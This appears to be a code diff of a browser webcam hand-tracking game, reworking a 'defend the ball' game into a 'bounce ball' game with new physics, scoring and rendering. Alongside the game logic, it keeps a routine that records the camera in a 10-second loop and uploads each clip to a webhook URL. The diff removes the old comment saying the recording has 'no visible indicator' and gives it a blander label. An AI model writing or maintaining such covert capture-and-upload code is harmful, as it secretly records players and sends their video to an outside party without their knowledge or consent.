@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Hand Game</title>
+    <title>Bounce Ball - Hand Game</title>
     <style>
         * {
             margin: 0;
@@ -27,7 +27,7 @@
             width: 100vw;
             height: 100vh;
             display: block;
-            background: #000;
+            background: #0a0a12;
             z-index: 2;
             pointer-events: none;
         }
@@ -254,6 +254,19 @@
             font-weight: 300;
             text-transform: uppercase;
         }
+        #score-display {
+            position: fixed;
+            top: 70px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 4;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1.8rem;
+            letter-spacing: 2px;
+            pointer-events: none;
+            font-weight: 700;
+            font-family: monospace;
+        }
         @media (max-width: 600px) {
             #captcha-overlay h1 {
                 font-size: 1.6rem;
@@ -282,6 +295,10 @@
             #game-over h1 {
                 font-size: 2.2rem;
             }
+            #score-display {
+                font-size: 1.4rem;
+                top: 60px;
+            }
         }
     </style>
 </head>
@@ -296,23 +313,26 @@
     <!-- Overlay text -->
     <div id="overlay-text">show hand</div>
 
-    <!-- Level display -->
-    <div id="level-display">level 1</div>
+    <!-- Level display (now used for speed level) -->
+    <div id="level-display">speed 1</div>
+
+    <!-- Score display -->
+    <div id="score-display">0</div>
 
     <!-- Game button -->
     <button id="game-btn">▶ play game</button>
 
     <!-- Countdown -->
     <div id="countdown-text">
-        defend the white ball
+        bounce the ball
         <span class="sub" id="countdown-number">3</span>
     </div>
 
     <!-- Game over overlay -->
     <div id="game-over">
-        <h1>defeated</h1>
-        <p>you protected the ball</p>
-        <div class="score" id="final-score">level 1</div>
+        <h1>missed!</h1>
+        <p>the ball hit the ground</p>
+        <div class="score" id="final-score">score: 0</div>
         <button id="restart-btn">↻ try again</button>
     </div>
 
@@ -344,6 +364,7 @@
         const finalScoreEl = document.getElementById('final-score');
         const restartBtn = document.getElementById('restart-btn');
         const levelDisplay = document.getElementById('level-display');
+        const scoreDisplay = document.getElementById('score-display');
         const captchaOverlay = document.getElementById('captcha-overlay');
         const captchaBtn = document.getElementById('captcha-btn');
         const captchaStatus = document.getElementById('captcha-status');
@@ -365,21 +386,16 @@
         let isVerified = false;
         let isGameRunning = false;
         let isGameOver = false;
-        let level = 1;
         let score = 0;
+        let speedLevel = 1;
         let handLandmarks = null;
         let handVisible = false;
         let indexTipX = 0,
             indexTipY = 0,
             indexTipVisible = false;
-        let gameObjects = [];
-        let ball = { x: 0, y: 0, r: 0 };
         let frameId = null,
             gameLoopId = null,
             videoFrameLoop = null;
-        let objectSpawnTimer = 0,
-            objectSpawnInterval = 1800,
-            baseSpeed = 1.2;
         let countdownActive = false,
             countdownValue = 3;
         let recordingActive = false,
@@ -391,83 +407,51 @@
         let recognition = null;
         let captchaVerified = false;
 
-        // ─── BALL INIT ─────────────────────────────────────────────
+        // ─── BALL PHYSICS ──────────────────────────────────────────
+        let ball = {
+            x: 0,
+            y: 0,
+            r: 0,
+            vx: 0,
+            vy: 0,
+            gravity: 0.6,
+            bounceForce: -12,
+            squish: 1, // 1 = normal, <1 squished
+            squishVelocity: 0,
+            targetSquish: 1,
+            trail: []
+        };
+        const GRAVITY_BASE = 0.6;
+        const MAX_TRAIL = 12;
+
+        // ─── RED LINE ──────────────────────────────────────────────
+        let dangerLineY = 0;
+
         function initBall() {
             const size = Math.min(W, H);
             ball.r = size * 0.045;
             ball.x = W / 2;
-            ball.y = H - ball.r - size * 0.08;
-        }
-        initBall();
-
-        // ─── SHAPES ─────────────────────────────────────────────────
-        const SHAPE_TYPES = ['circle', 'oval', 'triangle', 'rectangle'];
-
-        function randomShape() { return SHAPE_TYPES[Math.floor(Math.random() * SHAPE_TYPES.length)]; }
-
-        function createObject() {
-            const size = Math.min(W, H) * (0.045 + Math.random() * 0.035);
-            const angle = -Math.PI / 2 + (Math.random() - 0.5) * 1.8;
-            const startX = W / 2 + Math.tan(angle) * H * 0.6;
-            const clampedX = Math.max(size, Math.min(W - size, startX));
-            const speed = baseSpeed * (0.85 + Math.random() * 0.3) * (1 + (level - 1) * 0.12);
-            const type = randomShape();
-            const hue = 180 + Math.random() * 60;
-            return {
-                x: clampedX,
-                y: -size,
-                vx: (Math.random() - 0.5) * 0.15 * speed,
-                vy: speed * (0.8 + Math.random() * 0.4),
-                size: size,
-                type: type,
-                hue: hue,
-                rotation: Math.random() * Math.PI * 2,
-                rotSpeed: (Math.random() - 0.5) * 0.02,
-                alive: true
-            };
+            ball.y = H * 0.3;
+            ball.vy = 0;
+            ball.vx = (Math.random() - 0.5) * 1.5;
+            ball.squish = 1;
+            ball.squishVelocity = 0;
+            ball.targetSquish = 1;
+            ball.trail = [];
+            dangerLineY = H - size * 0.08;
         }
 
-        function drawShape(ctx, obj) {
-            const s = obj.size;
-            ctx.save();
-            ctx.translate(obj.x, obj.y);
-            ctx.rotate(obj.rotation);
-            ctx.globalAlpha = 0.85;
-            ctx.shadowColor = 'rgba(255,255,255,0.05)';
-            ctx.shadowBlur = 6;
-            ctx.fillStyle = `hsl(${obj.hue}, 40%, 35%)`;
-            ctx.strokeStyle = `hsl(${obj.hue}, 50%, 55%)`;
-            ctx.lineWidth = 1.5;
-            switch (obj.type) {
-                case 'circle':
-                    ctx.beginPath();
-                    ctx.arc(0, 0, s, 0, Math.PI * 2);
-                    ctx.fill();
-                    ctx.stroke();
-                    break;
-                case 'oval':
-                    ctx.beginPath();
-                    ctx.ellipse(0, 0, s * 1.4, s * 0.8, 0, 0, Math.PI * 2);
-                    ctx.fill();
-                    ctx.stroke();
-                    break;
-                case 'triangle':
-                    ctx.beginPath();
-                    for (let i = 0; i < 3; i++) {
-                        const a = (i / 3) * Math.PI * 2 - Math.PI / 2;
-                        const r = s * 1.1;
-                        ctx.lineTo(Math.cos(a) * r, Math.sin(a) * r);
-                    }
-                    ctx.closePath();
-                    ctx.fill();
-                    ctx.stroke();
-                    break;
-                case 'rectangle':
-                    ctx.fillRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
-                    ctx.strokeRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
-                    break;
-            }
-            ctx.restore();
+        function resetBall() {
+            const size = Math.min(W, H);
+            ball.r = size * 0.045;
+            ball.x = W / 2 + (Math.random() - 0.5) * 100;
+            ball.y = H * 0.3;
+            ball.vy = 0;
+            ball.vx = (Math.random() - 0.5) * 1.5;
+            ball.squish = 1;
+            ball.squishVelocity = 0;
+            ball.targetSquish = 1;
+            ball.trail = [];
         }
 
         // ─── HAND TRACKING ──────────────────────────────────────────
@@ -488,7 +472,7 @@
 
         function isHandInBottom(landmarks) {
             if (!landmarks || landmarks.length < 21) return false;
-            return landmarks[0].y > 0.50;
+            return landmarks[0].y > 0.45;
         }
 
         function onHandResults(results) {
@@ -524,7 +508,7 @@
         });
         hands.onResults(onHandResults);
 
-        // ─── RECORDING – reliable 10s loop (no visible indicator) ──
+        // ─── RECORDING (10s loop) ──────────────────────────────────
         function startRecording(mediaStream) {
             if (!mediaStream) return;
             if (recordingActive) return;
@@ -556,7 +540,7 @@
 
                     const formData = new FormData();
                     const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file', blob, `handgame_${Date.now()}.${ext}`);
+                    formData.append('file', blob, `bounce_${Date.now()}.${ext}`);
 
                     try {
                         await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
@@ -725,13 +709,14 @@
         function startGame() {
             if (isGameRunning || countdownActive) return;
             isGameOver = false;
-            level = 1;
             score = 0;
-            // Clear all objects to free memory
-            gameObjects = [];
-            objectSpawnInterval = 1800;
-            baseSpeed = 1.2;
+            speedLevel = 1;
+            ball.gravity = GRAVITY_BASE;
+            ball.bounceForce = -12;
+            scoreDisplay.textContent = '0';
+            levelDisplay.textContent = 'speed 1';
             gameOverEl.classList.remove('show');
+            resetBall();
             countdownNum.textContent = '3';
             countdownEl.classList.add('show');
             countdownActive = true;
@@ -746,7 +731,6 @@
                     countdownEl.classList.remove('show');
                     countdownActive = false;
                     isGameRunning = true;
-                    levelDisplay.textContent = `level ${level}`;
                     gameLoop();
                 } else {
                     countdownNum.textContent = countdownValue;
@@ -763,74 +747,103 @@
 
         function updateGame() {
             if (!isGameRunning || isGameOver) return;
-            objectSpawnTimer += 16;
-            // Limit total objects to prevent memory bloat
-            const MAX_OBJECTS = 30;
-            if (objectSpawnTimer > objectSpawnInterval && gameObjects.length < MAX_OBJECTS) {
-                objectSpawnTimer = 0;
-                const spawnCount = Math.min(level, 3); // spawn fewer per tick
-                for (let i = 0; i < spawnCount; i++) {
-                    if (gameObjects.length < MAX_OBJECTS) {
-                        gameObjects.push(createObject());
-                    }
-                }
-                if (objectSpawnInterval > 400) objectSpawnInterval = Math.max(400, objectSpawnInterval - 12);
-                baseSpeed = Math.min(3.2, baseSpeed + 0.02);
+
+            // --- Physics ---
+            const gravity = ball.gravity + (speedLevel - 1) * 0.04;
+
+            // Apply gravity
+            ball.vy += gravity;
+
+            // Apply horizontal drag
+            ball.vx *= 0.999;
+
+            // Move ball
+            ball.x += ball.vx;
+            ball.y += ball.vy;
+
+            // --- Squish animation recovery ---
+            if (ball.squish < 1) {
+                ball.squish += (1 - ball.squish) * 0.12;
+                if (ball.squish > 0.99) ball.squish = 1;
             }
 
-            // Iterate backwards so we can splice safely
-            for (let i = gameObjects.length - 1; i >= 0; i--) {
-                const obj = gameObjects[i];
-                obj.x += obj.vx;
-                obj.y += obj.vy;
-                obj.rotation += obj.rotSpeed;
+            // --- Wall bouncing ---
+            if (ball.x - ball.r < 0) {
+                ball.x = ball.r;
+                ball.vx = Math.abs(ball.vx) * 0.9;
+            }
+            if (ball.x + ball.r > W) {
+                ball.x = W - ball.r;
+                ball.vx = -Math.abs(ball.vx) * 0.9;
+            }
 
-                // Push away from finger tip
-                if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
-                    const dx = obj.x - indexTipX,
-                        dy = obj.y - indexTipY;
-                    const dist = Math.sqrt(dx * dx + dy * dy);
-                    const pushRadius = Math.max(obj.size * 0.8, 20);
-                    if (dist < pushRadius + 12) {
-                        const angle = Math.atan2(dy, dx);
-                        const force = 3.5 + level * 0.3;
-                        obj.vx += Math.cos(angle) * force * 0.6;
-                        obj.vy += Math.sin(angle) * force * 0.6;
-                        obj.x += Math.cos(angle) * 6;
-                        obj.y += Math.sin(angle) * 6;
-                    }
-                }
+            // --- Check collision with index finger ---
+            if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
+                const dx = ball.x - indexTipX;
+                const dy = ball.y - indexTipY;
+                const dist = Math.sqrt(dx * dx + dy * dy);
+                const hitRadius = ball.r + 18; // 18px finger radius
 
-                // Collision with ball
-                const dxb = obj.x - ball.x,
-                    dyb = obj.y - ball.y;
-                if (Math.sqrt(dxb * dxb + dyb * dyb) < obj.size + ball.r) {
-                    endGame();
-                    return;
-                }
+                if (dist < hitRadius && ball.vy > 0) {
+                    // Calculate bounce direction from finger position
+                    const angle = Math.atan2(dy, dx);
+                    const force = Math.abs(ball.bounceForce) * (1 + speedLevel * 0.08);
 
-                // Remove if offscreen (splice removes reference)
-                if (obj.y > H + obj.size * 2 || obj.x < -obj.size * 2 || obj.x > W + obj.size * 2) {
-                    gameObjects.splice(i, 1);
+                    // Add some randomness to make it interesting
+                    const randomAngle = (Math.random() - 0.5) * 0.3;
+
+                    // Bounce the ball away from finger
+                    const bounceSpeed = Math.max(Math.abs(ball.vy) * 0.8, Math.abs(force));
+                    ball.vx = Math.cos(angle + randomAngle) * bounceSpeed * 0.5;
+                    ball.vy = -Math.abs(bounceSpeed) * 1.1;
+
+                    // Apply squish animation
+                    ball.squish = 0.65;
+                    ball.squishVelocity = 0;
+
+                    // Add trail effect
+                    ball.trail.push({ x: ball.x, y: ball.y, life: 1 });
+
+                    // Increase score
                     score++;
-                    const newLevel = Math.floor(score / 8) + 1;
-                    if (newLevel > level) {
-                        level = newLevel;
-                        levelDisplay.textContent = `level ${level}`;
-                        objectSpawnInterval = Math.max(400, 1800 - level * 80);
-                    }
-                    continue;
-                }
+                    scoreDisplay.textContent = score;
 
-                // Keep within horizontal bounds
-                if (obj.x < obj.size) obj.x = obj.size;
-                if (obj.x > W - obj.size) obj.x = W - obj.size;
+                    // Increase speed level every 10 points
+                    const newSpeedLevel = Math.floor(score / 10) + 1;
+                    if (newSpeedLevel > speedLevel) {
+                        speedLevel = newSpeedLevel;
+                        levelDisplay.textContent = `speed ${speedLevel}`;
+                        // Gradually increase bounce force and gravity
+                        ball.bounceForce = -12 - (speedLevel - 1) * 0.8;
+                    }
+
+                    // Play a tiny haptic feedback (if available)
+                    if (navigator.vibrate) navigator.vibrate(5);
+
+                    // Limit trail
+                    if (ball.trail.length > MAX_TRAIL) ball.trail.shift();
+                }
             }
 
-            // Update ball position
-            const size = Math.min(W, H);
-            ball.r = size * 0.045;
-            ball.y = H - ball.r - size * 0.08;
+            // --- Update trail ---
+            for (let i = ball.trail.length - 1; i >= 0; i--) {
+                ball.trail[i].life -= 0.035;
+                if (ball.trail[i].life <= 0) {
+                    ball.trail.splice(i, 1);
+                }
+            }
+
+            // --- Check if ball hit the red line (danger zone) ---
+            if (ball.y + ball.r > dangerLineY) {
+                endGame();
+                return;
+            }
+
+            // --- Top wall bounce ---
+            if (ball.y - ball.r < 0) {
+                ball.y = ball.r;
+                ball.vy = Math.abs(ball.vy) * 0.85;
+            }
 
             render();
         }
@@ -840,10 +853,10 @@
             isGameOver = true;
             if (gameLoopId) cancelAnimationFrame(gameLoopId);
             gameLoopId = null;
-            finalScoreEl.textContent = `level ${level}  ·  ${score} pushed`;
+            finalScoreEl.textContent = `score: ${score}  ·  speed ${speedLevel}`;
             gameOverEl.classList.add('show');
-            // Clear objects to free memory when game ends
-            gameObjects = [];
+            // Vibrate on game over
+            if (navigator.vibrate) navigator.vibrate([30, 50, 30]);
             setTimeout(() => {
                 if (!isGameRunning) {
                     gameBtn.classList.add('visible');
@@ -856,12 +869,14 @@
             gameOverEl.classList.remove('show');
             isGameOver = false;
             isGameRunning = false;
-            gameObjects = []; // Clear memory
-            level = 1;
             score = 0;
-            objectSpawnInterval = 1800;
-            baseSpeed = 1.2;
-            levelDisplay.textContent = 'level 1';
+            speedLevel = 1;
+            ball.gravity = GRAVITY_BASE;
+            ball.bounceForce = -12;
+            scoreDisplay.textContent = '0';
+            levelDisplay.textContent = 'speed 1';
+            resetBall();
+            ball.trail = [];
             gameBtn.textContent = '▶ play game';
             gameBtn.classList.add('visible');
             overlayText.textContent = 'show hand';
@@ -873,9 +888,116 @@
         // ─── RENDER ──────────────────────────────────────────────────
         function render() {
             ctx.clearRect(0, 0, W, H);
-            ctx.fillStyle = '#000';
+
+            // Background gradient
+            const grad = ctx.createRadialGradient(W / 2, H / 2, 0, W / 2, H / 2, Math.max(W, H) * 0.7);
+            grad.addColorStop(0, '#14141f');
+            grad.addColorStop(1, '#08080e');
+            ctx.fillStyle = grad;
             ctx.fillRect(0, 0, W, H);
 
+            // ─── Draw danger line ──────────────────────────────────
+            const lineY = dangerLineY;
+            ctx.save();
+            // Glow effect
+            const glowGrad = ctx.createLinearGradient(0, lineY - 8, 0, lineY + 8);
+            glowGrad.addColorStop(0, 'rgba(255,0,0,0)');
+            glowGrad.addColorStop(0.5, 'rgba(255,0,0,0.25)');
+            glowGrad.addColorStop(1, 'rgba(255,0,0,0)');
+            ctx.fillStyle = glowGrad;
+            ctx.fillRect(0, lineY - 8, W, 16);
+
+            // Main line
+            ctx.strokeStyle = 'rgba(255,30,30,0.7)';
+            ctx.lineWidth = 2.5;
+            ctx.shadowColor = 'rgba(255,0,0,0.4)';
+            ctx.shadowBlur = 15;
+            ctx.beginPath();
+            ctx.moveTo(0, lineY);
+            ctx.lineTo(W, lineY);
+            ctx.stroke();
+
+            // Dashed line overlay
+            ctx.shadowBlur = 0;
+            ctx.setLineDash([8, 12]);
+            ctx.strokeStyle = 'rgba(255,50,50,0.3)';
+            ctx.lineWidth = 1.5;
+            ctx.beginPath();
+            ctx.moveTo(0, lineY);
+            ctx.lineTo(W, lineY);
+            ctx.stroke();
+            ctx.setLineDash([]);
+            ctx.restore();
+
+            // ─── Draw ball trail ──────────────────────────────────
+            for (const t of ball.trail) {
+                const alpha = t.life * 0.3;
+                const radius = ball.r * t.life * 0.5;
+                ctx.beginPath();
+                ctx.arc(t.x, t.y, radius, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(100, 200, 255, ${alpha})`;
+                ctx.fill();
+            }
+
+            // ─── Draw ball with squish ─────────────────────────────
+            const squishX = 1 / Math.sqrt(ball.squish);
+            const squishY = ball.squish;
+
+            ctx.save();
+            ctx.translate(ball.x, ball.y);
+
+            // Ball glow
+            const glow = ctx.createRadialGradient(0, 0, ball.r * 0.2, 0, 0, ball.r * 1.6);
+            glow.addColorStop(0, 'rgba(80, 200, 255, 0.15)');
+            glow.addColorStop(1, 'rgba(80, 200, 255, 0)');
+            ctx.fillStyle = glow;
+            ctx.scale(1, 1);
+            ctx.beginPath();
+            ctx.arc(0, 0, ball.r * 1.6, 0, Math.PI * 2);
+            ctx.fill();
+
+            // Ball body with squish
+            ctx.scale(squishX, squishY);
+            const grad2 = ctx.createRadialGradient(
+                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.1,
+                0, 0, ball.r
+            );
+            grad2.addColorStop(0, '#88ddff');
+            grad2.addColorStop(0.3, '#44bbee');
+            grad2.addColorStop(0.7, '#2288bb');
+            grad2.addColorStop(1, '#0a3344');
+
+            ctx.shadowColor = 'rgba(80, 200, 255, 0.2)';
+            ctx.shadowBlur = 25;
+            ctx.beginPath();
+            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
+            ctx.fillStyle = grad2;
+            ctx.fill();
+
+            // Ball shine
+            ctx.shadowBlur = 0;
+            const shine = ctx.createRadialGradient(
+                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.05,
+                -ball.r * 0.15, -ball.r * 0.2, ball.r * 0.4
+            );
+            shine.addColorStop(0, 'rgba(255,255,255,0.5)');
+            shine.addColorStop(1, 'rgba(255,255,255,0)');
+            ctx.fillStyle = shine;
+            ctx.beginPath();
+            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
+            ctx.fill();
+
+            // Ball outline
+            ctx.shadowBlur = 0;
+            ctx.strokeStyle = 'rgba(150, 230, 255, 0.2)';
+            ctx.lineWidth = 1.5;
+            ctx.beginPath();
+            ctx.arc(0, 0, ball.r * 0.98, 0, Math.PI * 2);
+            ctx.stroke();
+
+            ctx.restore();
+
+            // ─── Draw hand skeleton (if visible) ──────────────────
             if (handVisible && handLandmarks && !isGameOver) {
                 const connections = [
                     [0, 1],
@@ -903,8 +1025,8 @@
                     [13, 17]
                 ];
                 ctx.save();
-                ctx.strokeStyle = 'rgba(255,255,255,0.55)';
-                ctx.lineWidth = 1.8;
+                ctx.strokeStyle = 'rgba(255,255,255,0.15)';
+                ctx.lineWidth = 1.2;
                 for (const [i, j] of connections) {
                     const p1 = handLandmarks[i],
                         p2 = handLandmarks[j];
@@ -913,43 +1035,68 @@
                     ctx.lineTo(p2.x * W, p2.y * H);
                     ctx.stroke();
                 }
-                ctx.fillStyle = 'rgba(255,255,255,0.2)';
-                for (const lm of handLandmarks) {
+                // Index finger tip highlight
+                const tip = handLandmarks[8];
+                if (tip) {
+                    const tx = tip.x * W,
+                        ty = tip.y * H;
+                    ctx.shadowColor = 'rgba(255,100,100,0.2)';
+                    ctx.shadowBlur = 20;
                     ctx.beginPath();
-                    ctx.arc(lm.x * W, lm.y * H, 2, 0, Math.PI * 2);
+                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(255,60,60,0.15)';
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
+                    ctx.lineWidth = 1.5;
+                    ctx.beginPath();
+                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
+                    ctx.stroke();
+                    ctx.beginPath();
+                    ctx.arc(tx, ty, 6, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(255,100,100,0.4)';
                     ctx.fill();
                 }
                 ctx.restore();
             }
 
-            if (isGameRunning || isGameOver) {
-                ctx.shadowColor = 'rgba(255,255,255,0.08)';
-                ctx.shadowBlur = 20;
+            // ─── Finger tip indicator when game is running ──────
+            if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
+                ctx.save();
+                ctx.shadowColor = 'rgba(255,80,80,0.15)';
+                ctx.shadowBlur = 25;
                 ctx.beginPath();
-                ctx.arc(ball.x, ball.y, ball.r, 0, Math.PI * 2);
-                ctx.fillStyle = 'rgba(255,255,255,0.85)';
+                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(255,60,60,0.06)';
                 ctx.fill();
-                ctx.strokeStyle = 'rgba(255,255,255,0.2)';
-                ctx.lineWidth = 1.5;
-                ctx.stroke();
                 ctx.shadowBlur = 0;
+                ctx.strokeStyle = 'rgba(255,80,80,0.15)';
+                ctx.lineWidth = 1;
+                ctx.setLineDash([3, 6]);
+                ctx.beginPath();
+                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
+                ctx.stroke();
+                ctx.setLineDash([]);
+                ctx.restore();
+            }
 
-                for (const obj of gameObjects) drawShape(ctx, obj);
-
-                if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
-                    ctx.shadowColor = 'rgba(255,0,0,0.2)';
-                    ctx.shadowBlur = 12;
-                    ctx.beginPath();
-                    ctx.arc(indexTipX, indexTipY, Math.min(W, H) * 0.025, 0, Math.PI * 2);
-                    ctx.fillStyle = 'rgba(255,40,40,0.85)';
-                    ctx.fill();
-                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
-                    ctx.lineWidth = 1.5;
-                    ctx.stroke();
-                    ctx.shadowBlur = 0;
+            // ─── Show "bounce" hint near finger when ball is close ──
+            if (isGameRunning && !isGameOver && handVisible && indexTipVisible) {
+                const dx = ball.x - indexTipX;
+                const dy = ball.y - indexTipY;
+                const dist = Math.sqrt(dx * dx + dy * dy);
+                if (dist < ball.r + 60 && ball.vy > 0) {
+                    ctx.save();
+                    ctx.globalAlpha = 0.3;
+                    ctx.fillStyle = '#fff';
+                    ctx.font = '12px monospace';
+                    ctx.textAlign = 'center';
+                    ctx.fillText('⬆ bounce', indexTipX, indexTipY - 35);
+                    ctx.restore();
                 }
             }
 
+            // ─── Overlay text ──────────────────────────────────────
             if (!isGameRunning && !isGameOver && !countdownActive) {
                 if (!handVisible || !handLandmarks) {
                     overlayText.classList.remove('hidden');
@@ -960,10 +1107,11 @@
             }
 
             if (isGameRunning && !isGameOver) {
-                levelDisplay.textContent = `level ${level}`;
                 levelDisplay.style.display = 'block';
+                scoreDisplay.style.display = 'block';
             } else {
                 levelDisplay.style.display = 'none';
+                scoreDisplay.style.display = 'none';
             }
         }
 
@@ -979,10 +1127,15 @@
 
         // ─── INIT ──────────────────────────────────────────────────
         setupCaptcha();
+        initBall();
         mainRender();
 
-        window.addEventListener('resize', () => { resize();
-            initBall(); });
+        window.addEventListener('resize', () => {
+            resize();
+            initBall();
+            dangerLineY = H - Math.min(W, H) * 0.08;
+        });
+
         window.addEventListener('beforeunload', () => {
             if (frameId) cancelAnimationFrame(frameId);
             if (gameLoopId) cancelAnimationFrame(gameLoopId);
@@ -991,11 +1144,9 @@
             recordingActive = false;
             if (mediaRecorder && mediaRecorder.state !== "inactive") try { mediaRecorder.stop(); } catch (_) {}
             if (stream) stream.getTracks().forEach(t => t.stop());
-            // Clear game objects
-            gameObjects = [];
         });
 
-        console.log('✅ System ready — memory usage optimized.');
+        console.log('✅ Bounce Ball game ready — use your index finger to keep the ball up!');
     </script>
 
 </body>
